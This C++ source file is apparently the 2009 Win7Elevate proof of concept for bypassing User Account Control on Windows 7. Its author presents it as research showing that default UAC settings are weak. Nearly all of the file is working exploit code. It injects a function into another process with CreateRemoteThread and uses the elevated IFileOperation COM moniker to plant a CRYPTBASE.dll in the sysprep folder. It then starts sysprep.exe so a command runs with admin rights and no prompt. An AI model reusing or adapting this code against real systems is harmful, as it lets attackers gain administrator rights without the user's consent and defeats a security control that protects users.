#include "stdafx.h"
#include "Win7Elevate_Utils.h"
#include "Win7Elevate_Inject.h"

#include ".\..\CMMN.h"

// All code (except for GetElevationType) (C) Leo Davidson, 8th February 2009, all rights reserved.
// (Minor tidy-up 12th June 2009 for the code's public release.)
// http://www.pretentiousname.com
// leo@ox.compsoc.net
//
// Using any part of this code for malicious purposes is expressly forbidden.
//
// This proof-of-concept code is intended only to demonstrate that code-injection
// poses a real problem with the default UAC settings in Windows 7 (tested with RC1 build 7100).

struct InjectArgs
{
	BOOL    (WINAPI *fpFreeLibrary)(HMODULE hLibModule);
	HMODULE (WINAPI *fpLoadLibrary)(LPCWSTR lpLibFileName);
	FARPROC (WINAPI *fpGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
	BOOL    (WINAPI *fpCloseHandle)(HANDLE);
	DWORD   (WINAPI *fpWaitForSingleObject)(HANDLE,DWORD);
	const wchar_t *szSourceDll;
	const wchar_t *szElevDir;
	const wchar_t *szElevDll;
	const wchar_t *szElevDllFull;
	const wchar_t *szElevExeFull;
	      wchar_t *szElevArgs; // Not const because of CreateProcess's in-place buffer modification. It's really not const so this is fine. (We don't use CreateProcess anymore but it doesn't hurt to keep this non-const just in case.)
	const wchar_t *szEIFOMoniker; // szElevatedIFileOperationMoniker
	const IID     *pIID_EIFOClass;
	const IID     *pIID_EIFO;
	const IID     *pIID_ShellItem2;
	const IID     *pIID_Unknown;
	const wchar_t *szShell32;
	const wchar_t *szOle32;
	const char    *szCoInitialize;
	const char    *szCoUninitialize;
	const char    *szCoGetObject;
	const char    *szCoCreateInstance;
	const char    *szSHCreateItemFPN; // SHCreateItemFromParsingName
	const char    *szShellExecuteExW;
};

static DWORD WINAPI RemoteCodeFunc(LPVOID lpThreadParameter)
{
	// This is the injected code of "part 1."

	// As this code is copied into another process it cannot refer to any static data (i.e. no string, GUID, etc. constants)
	// and it can only directly call functions that are within Kernel32.dll (which is all we need as it lets us call
	// LoadLibrary and GetProcAddress). The data we need (strings, GUIDs, etc.) is copied into the remote process and passed to
	// us in our InjectArgs structure.

	// The compiler settings are important. You have to ensure that RemoteCodeFunc doesn't do any stack checking (since it
	// involves a call into the CRT which may not exist (in the same place) in the target process) and isn't made inline
	// or anything like that. (Compiler optimizations are best turned off.) You need RemoteCodeFunc to be compiled into a
	// contiguous chunk of assembler that calls/reads/writes nothing except its own stack variables and what is passed to it via pArgs.

	// It's also important that all asm jump instructions in this code use relative addressing, not absolute. Jumps to absolute
	// addresses will not be valid after the code is copied to a different address in the target process. Visual Studio seems
	// to use absolute addresses sometimes and relative ones at other times and I'm not sure what triggers one or the other. For example,
	// I had a problem with it turning a lot of the if-statements in this code into absolute jumps when compiled for 32-bit and that
	// seemed to go away when I set the Release build to generate a PDF file, but then they came back again.
	// I never had this problem in February, and 64-bit builds always seem fine, but now in June I'm getting the problem with 32-bit
	// builds on my main machine. However, if I switch to the older compiler install and older Windows SDK that I have on another machine
	// it always builds a working 32-bit (and 64-bit) version, just like it used to. So I guess something in the compiler/SDK has triggered
	// this change but I don't know what. It could just be that things have moved around in memory due to a structure size change and that's
	// triggering the different modes... I don't know!
	//
	// So if the 32-bit version crashes the process you inject into, you probably need to work out how to convince the compiler
	// to generate the code it used to in February. :) Or you could write some code to fix up the jump instructions after copying them,
	// or hand-code the 32-bit asm (seems you can ignore 64-bit as it always works so far), or find a style of if-statement (or equivalent)
	// that always generates relative jumps, or whatever...
	//
	// Take a look at the asm_code_issue.png image that comes with the source to see what the absolute and relative jumps look like.
	//
	// PS: I've never written Intel assembler, and it's many years since I've hand-written any type of assembler, so I may have the wrong end
	// of the stick about some of this! Either way, 32-bit version works when built on my older compiler/SDK install and usually doesn't on
	// the newer install.

	InjectArgs * pArgs = reinterpret_cast< InjectArgs * >(lpThreadParameter);
	
	// Use an elevated FileOperation object to copy a file to a protected folder.
	// If we're in a process that can do silent COM elevation then we can do this without any prompts.

	HMODULE hModuleOle32    = pArgs->fpLoadLibrary(pArgs->szOle32);
	HMODULE hModuleShell32  = pArgs->fpLoadLibrary(pArgs->szShell32);

	if (hModuleOle32
	&&	hModuleShell32)
	{
		// Load the non-Kernel32.dll functions that we need.

		W7EUtils::GetProcAddr< HRESULT (STDAPICALLTYPE *)(LPVOID pvReserved) >
			tfpCoInitialize( pArgs->fpGetProcAddress, hModuleOle32, pArgs->szCoInitialize );

		W7EUtils::GetProcAddr< void (STDAPICALLTYPE *)(void) >
			tfpCoUninitialize( pArgs->fpGetProcAddress, hModuleOle32, pArgs->szCoUninitialize );

		W7EUtils::GetProcAddr< HRESULT (STDAPICALLTYPE *)(LPCWSTR pszName, BIND_OPTS *pBindOptions, REFIID riid, void **ppv) >
			tfpCoGetObject( pArgs->fpGetProcAddress, hModuleOle32, pArgs->szCoGetObject );

		W7EUtils::GetProcAddr< HRESULT (STDAPICALLTYPE *)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, void ** ppv) >
			tfpCoCreateInstance( pArgs->fpGetProcAddress, hModuleOle32, pArgs->szCoCreateInstance );

		W7EUtils::GetProcAddr< HRESULT (STDAPICALLTYPE *)(PCWSTR pszPath, IBindCtx *pbc, REFIID riid, void **ppv) >
			tfpSHCreateItemFromParsingName( pArgs->fpGetProcAddress, hModuleShell32, pArgs->szSHCreateItemFPN );

		W7EUtils::GetProcAddr< BOOL (STDAPICALLTYPE *)(LPSHELLEXECUTEINFOW lpExecInfo) >
			tfpShellExecuteEx( pArgs->fpGetProcAddress, hModuleShell32, pArgs->szShellExecuteExW );

		if (0 != tfpCoInitialize.f
		&&	0 != tfpCoUninitialize.f
		&&	0 != tfpCoGetObject.f
		&&	0 != tfpCoCreateInstance.f
		&&	0 != tfpSHCreateItemFromParsingName.f
		&&	0 != tfpShellExecuteEx.f)
		{
			if (S_OK == tfpCoInitialize.f(NULL))
			{
				BIND_OPTS3 bo;
				for(int i = 0; i < sizeof(bo); ++i) { reinterpret_cast< BYTE * >(&bo)[i] = 0; } // This loop is easier than pushing ZeroMemory or memset through pArgs.
				bo.cbStruct = sizeof(bo);
				bo.dwClassContext = CLSCTX_LOCAL_SERVER;

				// For testing other COM objects/methods, start here.
				{
					IFileOperation *pFileOp = 0;
					IShellItem *pSHISource = 0;
					IShellItem *pSHIDestination = 0;
					IShellItem *pSHIDelete = 0;

					// This is a completely standard call to IFileOperation, if you ignore all the pArgs/func-pointer indirection.
					if (
						(pArgs->szEIFOMoniker  && S_OK == tfpCoGetObject.f( pArgs->szEIFOMoniker, &bo, *pArgs->pIID_EIFO, reinterpret_cast< void ** >(&pFileOp)))
					||	(pArgs->pIID_EIFOClass && S_OK == tfpCoCreateInstance.f( *pArgs->pIID_EIFOClass, NULL, CLSCTX_LOCAL_SERVER|CLSCTX_INPROC_SERVER|CLSCTX_INPROC_HANDLER, *pArgs->pIID_EIFO, reinterpret_cast< void ** >(&pFileOp)))
						)
					if (0    != pFileOp)
					if (S_OK == pFileOp->SetOperationFlags(FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS|FOFX_REQUIREELEVATION))
					if (S_OK == tfpSHCreateItemFromParsingName.f( pArgs->szSourceDll, NULL, *pArgs->pIID_ShellItem2, reinterpret_cast< void ** >(&pSHISource)))
					if (0    != pSHISource)
					if (S_OK == tfpSHCreateItemFromParsingName.f( pArgs->szElevDir, NULL, *pArgs->pIID_ShellItem2, reinterpret_cast< void ** >(&pSHIDestination)))
					if (0    != pSHIDestination)
					if (S_OK == pFileOp->CopyItem(pSHISource, pSHIDestination, pArgs->szElevDll, NULL))
					if (S_OK == pFileOp->PerformOperations())
					{
						// Use ShellExecuteEx to launch the "part 2" target process. Again, a completely standard API call.
						// (Note: Don't use CreateProcess as it seems not to do the auto-elevation stuff.)
						SHELLEXECUTEINFO shinfo;
						for(int i = 0; i < sizeof(shinfo); ++i) { reinterpret_cast< BYTE * >(&shinfo)[i] = 0; } // This loop is easier than pushing ZeroMemory or memset through pArgs.
						shinfo.cbSize = sizeof(shinfo);
						shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
						shinfo.lpFile = pArgs->szElevExeFull;
						shinfo.lpParameters = pArgs->szElevArgs;
						shinfo.lpDirectory = pArgs->szElevDir;
						shinfo.nShow = SW_SHOW;

						if (tfpShellExecuteEx.f(&shinfo) && shinfo.hProcess != NULL)
						{
							// Wait for the "part 2" target process to finish.
							pArgs->fpWaitForSingleObject(shinfo.hProcess, INFINITE);

							pArgs->fpCloseHandle(shinfo.hProcess);
						}

						// Another standard call to IFileOperation, this time to delete our dummy DLL. We clean up our mess.
						if (S_OK == tfpSHCreateItemFromParsingName.f( pArgs->szElevDllFull, NULL, *pArgs->pIID_ShellItem2, reinterpret_cast< void ** >(&pSHIDelete)))
						if (0    != pSHIDelete)
						if (S_OK == pFileOp->DeleteItem(pSHIDelete, NULL))
						{
							pFileOp->PerformOperations();
						}
					}

					if (pSHIDelete)      { pSHIDelete->Release();      }
					if (pSHIDestination) { pSHIDestination->Release(); }
					if (pSHISource)      { pSHISource->Release();      }
					if (pFileOp)         { pFileOp->Release();         }
				}

				tfpCoUninitialize.f();
			}
		}
	}

	if (hModuleShell32)  { pArgs->fpFreeLibrary(hModuleShell32);  }
	if (hModuleOle32)    { pArgs->fpFreeLibrary(hModuleOle32);    }

	return 0;
}

// Marks the end of the function so we know how much data to copy.
volatile static void DummyRemoteCodeFuncEnd()
{
}

void W7EInject::AttemptOperation(HWND hWnd, bool bInject, bool bElevate, DWORD dwPid, const wchar_t *szProcName,
								 const wchar_t *szCmd, const wchar_t *szArgs, const wchar_t *szDir,
								 const wchar_t *szPathToOurDll, 
								 DWORD (__stdcall *Redirector)(void))
{
	bool bThreadWaitSuccess = false;
	bool bThreadWaitFailure = false;
	HANDLE hTargetProc = NULL;

	const BYTE * codeStartAdr = reinterpret_cast< const BYTE * >( &RemoteCodeFunc );
	const BYTE * codeEndAdr   = reinterpret_cast< const BYTE * >( &DummyRemoteCodeFuncEnd );

	if (codeStartAdr >= codeEndAdr)
	{
		//MessageBox(hWnd, L"Unexpected function layout", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Unexpected function layout");
		return;
	}

	wchar_t szPathToSelf[MAX_PATH];

	DWORD dwGMFNRes = GetModuleFileName(NULL, szPathToSelf, _countof(szPathToSelf));

	if (dwGMFNRes == 0 || dwGMFNRes >= _countof(szPathToSelf))
	{
		//MessageBox(hWnd, L"Couldn't get path to self", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Couldn't get path to self");
		return;
	}

	wchar_t szProgramFiles[MAX_PATH];

	HRESULT hr = SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, szProgramFiles);

	if (S_OK != hr)
	{
		//MessageBox(hWnd, L"SHGetFolderPath failed", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"SHGetFolderPath failed");
		return;
	}

	HMODULE hModKernel32 = LoadLibrary(L"kernel32.dll");

	if (hModKernel32 == 0)
	{
		//MessageBox(hWnd, L"Couldn't load kernel32.dll", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Couldn't load kernel32.dll");
		return;
	}	

	W7EUtils::GetProcAddr< BOOL    (WINAPI *)(HMODULE)         > tfpFreeLibrary(         &GetProcAddress, hModKernel32, "FreeLibrary");
	W7EUtils::GetProcAddr< HMODULE (WINAPI *)(LPCWSTR)         > tfpLoadLibrary(         &GetProcAddress, hModKernel32, "LoadLibraryW");
	W7EUtils::GetProcAddr< FARPROC (WINAPI *)(HMODULE, LPCSTR) > tfpGetProcAddress(      &GetProcAddress, hModKernel32, "GetProcAddress");
	W7EUtils::GetProcAddr< BOOL    (WINAPI *)(HANDLE)          > tfpCloseHandle(         &GetProcAddress, hModKernel32, "CloseHandle");
	W7EUtils::GetProcAddr< DWORD   (WINAPI *)(HANDLE,DWORD)    > tfpWaitForSingleObject( &GetProcAddress, hModKernel32, "WaitForSingleObject");

	if (0 == tfpFreeLibrary.f
	||	0 == tfpLoadLibrary.f
	||	0 == tfpGetProcAddress.f
	||	0 == tfpCloseHandle.f
	||	0 == tfpWaitForSingleObject.f)
	{
		//MessageBox(hWnd, L"Couldn't find API", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Couldn't find API");
	}
	else
	{
		// Here we define the target process and DLL for "part 2." This is an auto/silent-elevating process which isn't
		// directly below System32 and which loads a DLL which is directly below System32 but isn't on the OS's "Known DLLs" list.
		// If we copy our own DLL with the same name to the exe's folder then the exe will load our DLL instead of the real one.
		const wchar_t *szElevDir = L"C:\\Windows\\System32\\sysprep";
		const wchar_t *szElevDll = L"CRYPTBASE.dll";
		const wchar_t *szElevDllFull = L"C:\\Windows\\System32\\sysprep\\CRYPTBASE.dll";
		const wchar_t *szElevExeFull = L"C:\\Windows\\System32\\sysprep\\sysprep.exe";
		std::wstring strElevArgs = L"\"";
//		strElevArgs += szElevExeFull;
//		strElevArgs += L"\" \"";
		strElevArgs += szCmd;
		strElevArgs += L"\" \"";
		strElevArgs += szDir;
		strElevArgs += L"\" \"";
		for (const wchar_t *pCmdArgChar = szArgs; *szArgs; ++szArgs)
		{
			if (*szArgs != L'\"')
			{
				strElevArgs += *szArgs;
			}
			else
			{
				strElevArgs += L"\"\"\""; // Turn each quote into three to preserve them in the arguments.
			}
		}
		strElevArgs += L"\"";

		if (!bInject)
		{
			// Test code without remoting.
			// This should result in a UAC prompt, if UAC is on at all and we haven't been launched as admin.

			// Satisfy CreateProcess's non-const args requirement
			wchar_t *szElevArgsNonConst = new wchar_t[strElevArgs.length() + 1];
			wcscpy_s(szElevArgsNonConst, strElevArgs.length() + 1, strElevArgs.c_str());

			InjectArgs ia;
			ia.fpFreeLibrary         = tfpFreeLibrary.f;
			ia.fpLoadLibrary         = tfpLoadLibrary.f;
			ia.fpGetProcAddress      = tfpGetProcAddress.f;
			ia.fpCloseHandle         = tfpCloseHandle.f;
			ia.fpWaitForSingleObject = tfpWaitForSingleObject.f;
			ia.szSourceDll           = szPathToOurDll;
			ia.szElevDir             = szElevDir;
			ia.szElevDll             = szElevDll;
			ia.szElevDllFull         = szElevDllFull;
			ia.szElevExeFull         = szElevExeFull;
			ia.szElevArgs            = szElevArgsNonConst;
			ia.szShell32             = L"shell32.dll";
			ia.szOle32               = L"ole32.dll";
			ia.szCoInitialize        = "CoInitialize";
			ia.szCoUninitialize      = "CoUninitialize";
			ia.szCoGetObject         = "CoGetObject";
			ia.szCoCreateInstance    = "CoCreateInstance";
			ia.szSHCreateItemFPN     = "SHCreateItemFromParsingName";
			ia.szShellExecuteExW     = "ShellExecuteExW";
			ia.szEIFOMoniker         = bElevate ? L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}" : NULL;
			ia.pIID_EIFOClass        = bElevate ? NULL : &__uuidof(FileOperation);
			ia.pIID_EIFO             = &__uuidof(IFileOperation);
			ia.pIID_ShellItem2       = &__uuidof(IShellItem2);
			ia.pIID_Unknown          = &__uuidof(IUnknown);

			RemoteCodeFunc(&ia);

			delete[] szElevArgsNonConst;
		}
		else if (W7EUtils::OpenProcessToInject(hWnd, &hTargetProc, dwPid, szProcName))
		{
			// Test code with remoting.
			// At least as of RC1 build 7100, with the default OS settings, this will run the specified command
			// with elevation but without triggering a UAC prompt.

			// Scope CRemoteMemory so it's destroyed before the process handle is closed.
			{
				W7EUtils::CRemoteMemory reme(hTargetProc);

				InjectArgs ia;
				// ASSUMPTION: Remote process has same ASLR setting as us (i.e. ASLR = on)
				//             kernel32.dll is mapped to the same address range in both processes.
				ia.fpFreeLibrary         = tfpFreeLibrary.f;
				ia.fpLoadLibrary         = tfpLoadLibrary.f;
				ia.fpGetProcAddress      = tfpGetProcAddress.f;
				ia.fpCloseHandle         = tfpCloseHandle.f;
				ia.fpWaitForSingleObject = tfpWaitForSingleObject.f;

				// It would be more efficient to allocate and copy the data in one
				// block but since this is just a proof-of-concept I don't bother.

				ia.szSourceDll           = reme.AllocAndCopyMemory(szPathToOurDll);
				ia.szElevDir             = reme.AllocAndCopyMemory(szElevDir);
				ia.szElevDll             = reme.AllocAndCopyMemory(szElevDll);
				ia.szElevDllFull         = reme.AllocAndCopyMemory(szElevDllFull);
				ia.szElevExeFull         = reme.AllocAndCopyMemory(szElevExeFull);
				ia.szElevArgs            = reme.AllocAndCopyMemory(strElevArgs.c_str(), false); // Leave this page writeable for CreateProcess.
									 
				ia.szShell32             = reme.AllocAndCopyMemory(L"shell32.dll");
				ia.szOle32               = reme.AllocAndCopyMemory(L"ole32.dll");
				ia.szCoInitialize        = reme.AllocAndCopyMemory("CoInitialize");
				ia.szCoUninitialize      = reme.AllocAndCopyMemory("CoUninitialize");
				ia.szCoGetObject         = reme.AllocAndCopyMemory("CoGetObject");
				ia.szCoCreateInstance    = reme.AllocAndCopyMemory("CoCreateInstance");
				ia.szSHCreateItemFPN     = reme.AllocAndCopyMemory("SHCreateItemFromParsingName");
				ia.szShellExecuteExW     = reme.AllocAndCopyMemory("ShellExecuteExW");
				ia.szEIFOMoniker         = bElevate ? reme.AllocAndCopyMemory(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}") : NULL;
				ia.pIID_EIFOClass        = bElevate ? NULL : reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(FileOperation), sizeof(__uuidof(FileOperation)), false) );
				ia.pIID_EIFO             = reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(IFileOperation), sizeof(__uuidof(IFileOperation)), false) );
				ia.pIID_ShellItem2       = reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(IShellItem2),    sizeof(__uuidof(IShellItem2)),    false) );
				ia.pIID_Unknown          = reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(IUnknown),       sizeof(__uuidof(IUnknown)),       false) );

				void *pRemoteArgs = reme.AllocAndCopyMemory(&ia, sizeof(ia), false);

				void *pRemoteFunc = reme.AllocAndCopyMemory( RemoteCodeFunc, codeEndAdr - codeStartAdr, true);

				if (reme.AnyFailures())
				{
					//MessageBox(hWnd, L"Remote allocation failed", L"Win7Elevate", MB_OK | MB_ICONWARNING);
					CLogger::LogLine(L"Remote allocation failed");
				}
				else
				{
					HANDLE hRemoteThread = CreateRemoteThread(hTargetProc, NULL, 0, reinterpret_cast< LPTHREAD_START_ROUTINE >( pRemoteFunc ), pRemoteArgs, 0, NULL);

					if (hRemoteThread == 0)
					{
						//MessageBox(hWnd, L"Couldn't create remote thread", L"Win7Elevate", MB_OK | MB_ICONWARNING);
						CLogger::LogLine(
							CError::Format( 
								GetLastError(),
								L"Couldn't create remote thread", 
								L"CreateRemoteThread"));

					}
					else
					{
						if ( Redirector )
							Redirector();

						while(true)
						{
							DWORD dwWaitRes = WaitForSingleObject(hRemoteThread, 10000);

							if (dwWaitRes == WAIT_OBJECT_0)
							{
								bThreadWaitSuccess = true;
								break;
							}
							else if (dwWaitRes != WAIT_TIMEOUT)
							{
								bThreadWaitFailure = true;
								break;
							}
							//else if (IDCANCEL == MessageBox(hWnd, L"Continue waiting for remote thread to complete?", L"Win7Elevate", MB_OKCANCEL | MB_ICONQUESTION))
							else
							{
								CLogger::LogLine(L"Continue waiting for remote thread to complete? : NO");
								// See if it completed before the user asked to stop waiting.
								// Code that wasn't just a proof-of-concept would use a worker thread that could cancel the wait UI.
								if (WAIT_OBJECT_0 == WaitForSingleObject(hRemoteThread, 0))
								{
									bThreadWaitSuccess = true;
								}
								break;
							}
						}

						if (!bThreadWaitSuccess)
						{
							// The memory in the other process could still be in use.
							// Freeing it now will almost certainly crash the other process.
							// Letting it leak is the lesser of two evils...
							reme.LeakMemory();
						}
					}
				}
			}
			CloseHandle(hTargetProc);
		}
	}

	FreeLibrary(hModKernel32);

	if (bThreadWaitFailure)
	{
		//MessageBox(hWnd, L"Error waiting on the remote thread to complete", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		CLogger::LogLine(L"Error waiting on the remote thread to complete");
	}
	else if (bThreadWaitSuccess)
	{
		//MessageBox(hWnd, L"Remote thread completed", L"Win7Elevate", MB_OK | MB_ICONINFORMATION);
		CLogger::LogLine(L"Remote thread completed");
	}
}
